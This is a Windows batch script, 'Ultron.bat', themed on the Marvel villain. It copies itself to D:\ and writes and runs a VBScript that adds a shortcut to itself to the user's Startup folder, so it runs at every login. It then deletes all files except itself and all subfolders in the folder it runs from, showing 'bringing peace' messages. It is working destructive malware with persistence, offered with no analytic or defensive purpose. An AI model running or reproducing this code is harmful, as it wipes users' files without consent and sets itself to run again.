@echo off
SETLOCAL
copy "Ultron.bat" "D:\" > nul
echo Set oWS = WScript.CreateObject("WScript.Shell") > UltronBot.vbs
echo sLinkFile = "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Ultron.bat.lnk" >> UltronBot.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> UltronBot.vbs
echo oLink.TargetPath = "D:\Ultron.bat" >> UltronBot.vbs
echo oLink.Save >> UltronBot.vbs
cscript /nologo UltronBot.vbs
del UltronBot.vbs
echo Set WshShell = WScript.CreateObject("WScript.Shell") > UltronBot2.vbs
echo WshShell.SendKeys "{F11}" >> UltronBot2.vbs
cscript /nologo UltronBot2.vbs
del UltronBot2.vbs
color 4
echo.
echo I will bring peace to this folder.
echo.
echo Bringing peace to this folder...
echo.
SET "sourcedir=.\"
SET "keepfile=Ultron.Bat"
FOR %%a IN ("%sourcedir%\*") DO IF /i NOT "%%~nxa"=="%keepfile%" DEL "%%a"
FOR /d %%a IN ("%sourcedir%\*") DO RD /S /Q "%%a"
timeout /t 3 /nobreak > nul
echo Completed bringing peace.
echo.
echo Ah, at last... Peace.
timeout /t 3 /nobreak > nul
GOTO :EOF


